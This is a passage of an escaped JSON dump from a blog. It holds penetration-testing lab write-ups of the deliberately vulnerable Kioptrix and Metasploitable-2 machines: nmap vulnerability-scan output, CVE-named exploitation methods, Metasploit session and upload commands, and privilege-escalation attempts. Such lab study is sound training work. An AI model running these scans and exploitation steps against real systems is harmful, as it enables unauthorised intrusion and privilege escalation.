cleartext data via a\n|           padding-oracle attack, aka the “POODLE” issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_3DES_EDE_CBC_SHA\n|     References:\n|       &lt;a href=\&quot;https://www.openssl.org/~bodo/ssl-poodle.pdf\&quot;&gt;https://www.openssl.org/~bodo/ssl-poodle.pdf&lt;/a&gt;\n|       &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566&lt;/a&gt;\n|       &lt;a href=\&quot;https://www.imperialviolet.org/2014/10/14/poodle.html\&quot;&gt;https://www.imperialviolet.org/2014/10/14/poodle.html&lt;/a&gt;\n|&lt;/em&gt;      &lt;a href=\&quot;https://www.securityfocus.com/bid/70574\&quot;&gt;https://www.securityfocus.com/bid/70574&lt;/a&gt;\n|_http-stored-xss: Couldn’t find any stored XSS vulnerabilities.\n|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)\n|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)\n|_sslv2-drown: ERROR: Script execution failed (use -d to debug)\n1024/tcp open  status      1 (RPC #100024)\nMAC Address: 00:0C:29:7C:3A:16 (VMware)&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;Host script results:\n| smb-vuln-cve2009-3103:\n|   VULNERABLE:\n|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2009-3103\n|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,\n|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a\n|           denial of service (system crash) via an &amp;#x26; (ampersand) character in a Process ID High header field in a NEGOTIATE\n|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,\n|           aka “SMBv2 Negotiation Vulnerability.”\n|&lt;br&gt;\n|     Disclosure date: 2009-09-08\n|     References:\n|       &lt;a href=\&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\&quot;&gt;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103&lt;/a&gt;\n|_      &lt;a href=\&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103\&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103&lt;/a&gt;\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [14]&lt;/p&gt;\n&lt;p&gt;Service detection performed. Please report any incorrect results at &lt;a href=\&quot;https://nmap.org/submit/\&quot;&gt;https://nmap.org/submit/&lt;/a&gt; .\nNmap done: 1 IP address (1 host up) scanned in 356.82 seconds`&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;information-gathering&quot;],&quot;text&quot;:[0,&quot;Information gathering&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-1--samba&quot;],&quot;text&quot;:[0,&quot;Method-1  Samba&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;method-2-openfuck-mod_ssl-vulnerability&quot;],&quot;text&quot;:[0,&quot;Method-2 OpenFuck mod_ssl vulnerability&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;enclosure&quot;],&quot;text&quot;:[0,&quot;Enclosure&quot;]}]]],&quot;localImagePaths&quot;:[1,[[0,&quot;img/1679306030928.png&quot;],[0,&quot;img/1679366939593.png&quot;],[0,&quot;img/1679366949376.png&quot;],[0,&quot;img/1679366954478.png&quot;],[0,&quot;img/1678960944499.png&quot;],[0,&quot;img/1678960950947.png&quot;]]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;Kioptrix level 1&quot;],&quot;date&quot;:[3,&quot;2023-03-20T03:01:48.000Z&quot;],&quot;categories&quot;:[0,&quot;Reproduction&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]]}],&quot;imagePaths&quot;:[1,[[0,&quot;img/1679306030928.png&quot;],[0,&quot;img/1679366939593.png&quot;],[0,&quot;img/1679366949376.png&quot;],[0,&quot;img/1679366954478.png&quot;],[0,&quot;img/1678960944499.png&quot;],[0,&quot;img/1678960950947.png&quot;]]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/10&quot;]}],[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;reproduction/metasploitable-2&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Metasploitable-2&quot;],&quot;date&quot;:[3,&quot;2023-03-20T03:01:48.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;漏洞复现&quot;],[0,&quot;OSCP&quot;]]],&quot;categories&quot;:[0,&quot;Reproduction&quot;]}],&quot;body&quot;:[0,&quot;Information Gathering\n```\nnetdiscover -r 192.168.124.0/24\nsudo nmap -sV -O -Pn -T4 192.168.124.32 -p-\nnmap --script vuln 192.168.124.32 -p- \n```\nThe scanning result is as enclosure.\n***\n# Mehod1:CVE-2007-2447\nSame as metasploitable-1,method1\n***\n# Method2:CVE-2011-2523\n ![](img/1675307808514.gif)\n ![](img/1675307841182.gif)\n ![](img/1675307847800.gif)\nit&#39;s \&quot;root\&quot; user\n ![](img/1675307860348.gif)\n ***\n# Method3:CVE-2004-2687\n ![](img/1675307882873.gif)\n ![](img/1675307890322.gif)\nPrivilege escalation is as follows\nchange shell to meterpreter\n ![](img/1675307945242.gif)\n Execute commond as follows:\n ```\nset sessoin 1\nexploit \nsessions -i 2\nshell\nupload linux-exploit-suggester\n```\n ![](img/1675307951578.gif)\nRemember add implement privilege to what you upload\n ![](img/1675307968824.gif)\n ![](img/1675307977375.gif)\nTry to escalate privilege by CVE-2018-14665\n ![](img/1675307983061.gif)\nFailed,What a pity.\nUse the method in previous hub.\n ![](img/1675307989107.gif)\nremove the suffix name of the public key,then it&#39;s the private key.\n ![](img/1675308017931.gif)\n ***\n# Method4:CVE-2012-1823\n ![](img/1675308052350.gif)\n ![](img/1675308066038.gif)\nNeed privilege escalaion again\n***\n# Enclosure\n┌──(kali㉿kali)-[~]\n└─$ nmap --script vuln 192.168.124.32 -p-     \nStarting Nmap 7.92 ( https://nmap.org ) at 2022-11-03 21:54 EDT\nNmap scan report for bogon (192.168.124.32)\nHost is up (0.0020s latency).\nNot shown: 65505 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n21/tcp    open  ftp\n| ftp-vsftpd-backdoor: \n|   VULNERABLE:\n|   vsFTPd version 2.3.4 backdoor\n|     State: VULNERABLE (Exploitable)\n|     IDs:  BID:48539  CVE:CVE-2011-2523\n|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.\n|     Disclosure date: 2011-07-03\n|     Exploit results:\n|       Shell command: id\n|       Results: uid=0(root) gid=0(root)\n|     References:\n|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb\n|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523\n|_      https://www.securityfocus.com/bid/48539\n22/tcp    open  ssh\n23/tcp    open  telnet\n25/tcp    open  smtp\n| ssl-poodle: \n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the \&quot;POODLE\&quot; issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_AES_128_CBC_SHA\n|     References:\n|       https://www.securityfocus.com/bid/70574\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\n|       https://www.imperialviolet.org/2014/10/14/poodle.html\n|_      https://www.openssl.org/~bodo/ssl-poodle.pdf\n|_sslv2-drown: ERROR: Script execution failed (use -d to debug)\n| smtp-vuln-cve2010-4344: \n|_  The SMTP server is not Exim: NOT VULNERABLE\n| ssl-dh-params: \n|   VULNERABLE:\n|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use anonymous\n|       Diffie-Hellman key exchange only provide protection against passive\n|       eavesdropping, and are vulnerable to active man-in-the-middle attacks\n|       which could completely compromise the confidentiality and integrity\n|       of any data exchanged over the resulting session.\n|     Check results:\n|       ANONYMOUS DH GROUP 1\n|             Cipher Suite: TLS_DH_anon_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: postfix builtin\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|       https://www.ietf.org/rfc/rfc2246.txt\n|   \n|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)\n|     State: VULNERABLE\n|     IDs:  BID:74733  CVE:CVE-2015-4000\n|       The Transport Layer Security (TLS) protocol contains a flaw that is\n|       triggered when handling Diffie-Hellman key exchanges defined with\n|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker\n|       to downgrade the security of a TLS session to 512-bit export-grade\n|       cryptography, which is significantly weaker, allowing the attacker\n|       to more easily break the encryption and monitor or tamper with\n|       the encrypted stream.\n|     Disclosure date: 2015-5-19\n|     Check results:\n|       EXPORT-GRADE DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: Unknown/Custom-generated\n|             Modulus Length: 512\n|             Generator Length: 8\n|             Public Key Length: 512\n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000\n|       https://www.securityfocus.com/bid/74733\n|       https://weakdh.org\n|   \n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: postfix builtin\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|_      https://weakdh.org\n53/tcp    open  domain\n80/tcp    open  http\n| http-enum: \n|   /tikiwiki/: Tikiwiki\n|   /test/: Test page\n|   /phpinfo.php: Possible information file\n|   /phpMyAdmin/: phpMyAdmin\n|   /doc/: Potentially interesting directory w/ listing on &#39;apache/2.2.8 (ubuntu) dav/2&#39;\n|   /icons/: Potentially interesting folder w/ directory listing\n|_  /index/: Potentially interesting folder\n|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.\n|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.\n|_http-phpself-xss: ERROR: Script execution failed (use -d to debug)\n|_http-trace: TRACE is enabled\n|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.\n|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)\n111/tcp   open  rpcbind\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n512/tcp   open  exec\n513/tcp   open  login\n514/tcp   open  shell\n1099/tcp  open  rmiregistry\n| rmi-vuln-classloader: \n|   VULNERABLE:\n|   RMI registry default configuration remote code execution vulnerability\n|     State: VULNERABLE\n|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.\n|       \n|     References:\n|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb\n1524/tcp  open  ingreslock\n2049/tcp  open  nfs\n2121/tcp  open  ccproxy-ftp\n3306/tcp  open  mysql\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n3632/tcp  open  distccd\n| distcc-cve2004-2687: \n|   VULNERABLE:\n|   distcc Daemon Command Execution\n|     State: VULNERABLE (Exploitable)\n|     IDs:  CVE:CVE-2004-2687\n|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)\n|       Allows executing of arbitrary commands on systems running distccd 3.1 and\n|       earlier. The vulnerability is the consequence of weak service configuration.\n|       \n|     Disclosure date: 2002-02-01\n|     Extra information:\n|       \n|     uid=1(daemon) gid=1(daemon) groups=1(daemon)\n|   \n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687\n|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687\n|_      https://distcc.github.io/security.html\n5432/tcp  open  postgresql\n| ssl-poodle: \n|   VULNERABLE:\n|   SSL POODLE information leak\n|     State: VULNERABLE\n|     IDs:  BID:70574  CVE:CVE-2014-3566\n|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other\n|           products, uses nondeterministic CBC padding, which makes it easier\n|           for man-in-the-middle attackers to obtain cleartext data via a\n|           padding-oracle attack, aka the \&quot;POODLE\&quot; issue.\n|     Disclosure date: 2014-10-14\n|     Check results:\n|       TLS_RSA_WITH_AES_128_CBC_SHA\n|     References:\n|       https://www.securityfocus.com/bid/70574\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566\n|       https://www.imperialviolet.org/2014/10/14/poodle.html\n|_      https://www.openssl.org/~bodo/ssl-poodle.pdf\n| ssl-dh-params: \n|   VULNERABLE:\n|   Diffie-Hellman Key Exchange Insufficient Group Strength\n|     State: VULNERABLE\n|       Transport Layer Security (TLS) services that use Diffie-Hellman groups\n|       of insufficient strength, especially those using one of a few commonly\n|       shared groups, may be susceptible to passive eavesdropping attacks.\n|     Check results:\n|       WEAK DH GROUP 1\n|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA\n|             Modulus Type: Safe prime\n|             Modulus Source: Unknown/Custom-generated\n|             Modulus Length: 1024\n|             Generator Length: 8\n|             Public Key Length: 1024\n|     References:\n|_      https://weakdh.org\n| ssl-ccs-injection: \n|   VULNERABLE:\n|   SSL/TLS MITM vulnerability (CCS Injection)\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h\n|       does not properly restrict processing of ChangeCipherSpec messages,\n|       which allows man-in-the-middle attackers to trigger use of a zero\n|       length master key in certain OpenSSL-to-OpenSSL communications, and\n|       consequently hijack sessions or obtain sensitive information, via\n|       a crafted TLS handshake, aka the \&quot;CCS Injection\&quot; vulnerability.\n|           \n|     References:\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224\n|       http://www.openssl.org/news/secadv_20140605.txt\n|_      http://www.cvedetails.com/cve/2014-0224\n5900/tcp  open  vnc\n6000/tcp  open  X11\n6667/tcp  open  irc\n| irc-botnet-channels: \n|_  ERROR: Closing Link: [192.168.124.43] (Throttled: Reconnecting too fast) -Email admin@Metasploitable.LAN for more information.\n6697/tcp  open  ircs-u\n| irc-botnet-channels: \n|_  ERROR: Closing Link: [192.168.124.43] (Throttled: Reconnecting too fast) -Email admin@Metasploitable.LAN for more information.\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n8009/tcp  open  ajp13\n8180/tcp  open  unknown\n| http-slowloris-check: \n|   VULNERABLE:\n|   Slowloris DOS attack\n|     State: LIKELY VULNERABLE\n|     IDs:  CVE:CVE-2007-6750\n|       Slowloris tries to keep many connections to the target web server open and hold\n|       them open as long as possible.  It accomplishes this by opening connections to\n|       the target web server and sending a partial request. By doing so, it starves\n|       the http server&#39;s resources causing Denial Of Service.\n|       \n|     Disclosure date: 2009-09-17\n|     References:\n|       http://ha.ckers.org/slowloris/\n|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\n| http-enum: \n|   /admin/: Possible admin folder\n|   /admin/index.html: Possible admin folder\n|   /admin/login.html: Possible admin folder\n|   /admin/admin.html: Possible admin folder\n|   /admin/account.html: Possible admin folder\n|   /admin/admin_login.html: Possible admin folder\n|   /admin/home.html: Possible admin folder\n|   /admin/admin-login.html: Possible admin folder\n|   /admin/adminLogin.html: Possible admin folder\n|   /admin/controlpanel.html: Possible admin folder\n|   /admin/cp.html: Possible admin folder\n|   /admin/index.jsp: Possible admin folder\n|   /admin/login.jsp: Possible admin folder\n|   /admin/admin.jsp: Possible admin folder\n|   /admin/home.jsp: Possible admin folder\n|   /admin/controlpanel.jsp: Possible admin folder\n|   /admin/admin-login.jsp: Possible admin folder\n|   /admin/cp.jsp: Possible admin folder\n|   /admin/account.jsp: Possible admin folder\n|   /admin/admin_login.jsp: Possible admin folder\n|   /admin/adminLogin.jsp: Possible admin folder\n|   /manager/html/upload: Apache Tomcat (401 Unauthorized)\n|   /manager/html: Apache Tomcat (401 Unauthorized)\n|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload\n|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload\n|   /admin/jscript/upload.html: Lizard Cart/Remote File upload\n|_  /webdav/: Potentially interesting folder\n8787/tcp  open  msgsrvr\n38316/tcp open  unknown\n44372/tcp open  unknown\n50889/tcp open  unknown\n55138/tcp open  unknown\n\nHost script results:\n|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)\n|_smb-vuln-ms10-054: false\n|_smb-vuln-ms10-061: false\n\nNmap done: 1 IP address (1 host up) scanned in 322.11 seconds&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Reproduction/Metasploitable-2.md&quot;],&quot;assetImports&quot;:[1,[[0,&quot;img/1675307808514.gif&quot;],[0,&quot;img/1675307841182.gif&quot;],[0,&quot;img/1675307847800.gif&quot;],[0,&quot;img/1675307860348.gif&quot;],[0,&quot;img/1675307882873.gif&quot;],[0,&quot;img/1675307890322.gif&quot;],[0,&quot;img/1675307945242.gif&quot;],[0,&quot;img/1675307951578.gif&quot;],[0,&quot;img/1675307968824.gif&quot;],[0,&quot;img/1675307977375.gif&quot;],[0,&quot;img/1675307983061.gif&quot;],[0,&quot;img/1675307989107.gif&quot;],[0,&quot;img/1675308017931.gif&quot;],[0,&quot;img/1675308052350.gif&quot;],[0,&quot;img/1675308066038.gif&quot;]]],&quot;digest&quot;:[0,&quot;b5472763c5cdf262&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;p&gt;Information Gathering&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;netdiscover -r 192.168.124.0/24&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sudo nmap -sV -O -Pn -T4 192.168.124.32 -p-&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;nmap --script vuln 192.168.124.32 -p- &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;The scanning result is as enclosure.&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;mehod1cve-2007-2447\&quot;&gt;Mehod1:CVE-2007-2447&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#mehod1cve-2007-2447\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;Same as metasploitable-1,method1&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;method2cve-2011-2523\&quot;&gt;Method2:CVE-2011-2523&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method2cve-2011-2523\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307808514.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307841182.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307847800.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nit’s “root” user\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307860348.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;hr&gt;\n&lt;h1 id=\&quot;method3cve-2004-2687\&quot;&gt;Method3:CVE-2004-2687&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#method3cve-2004-2687\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307882873.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307890322.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nPrivilege escalation is as follows\nchange shell to meterpreter\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307945242.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nExecute commond as follows:&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;set sessoin 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;exploit &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;sessions -i 2&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;shell&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;upload linux-exploit-suggester&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307951578.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nRemember add implement privilege to what you upload\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307968824.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307977375.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nTry to escalate privilege by CVE-2018-14665\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307983061.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nFailed,What a pity.\nUse the method in previous hub.\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/1675307989107.gif&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\nremove the suffix name of the public key,then it’s the private key.\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img 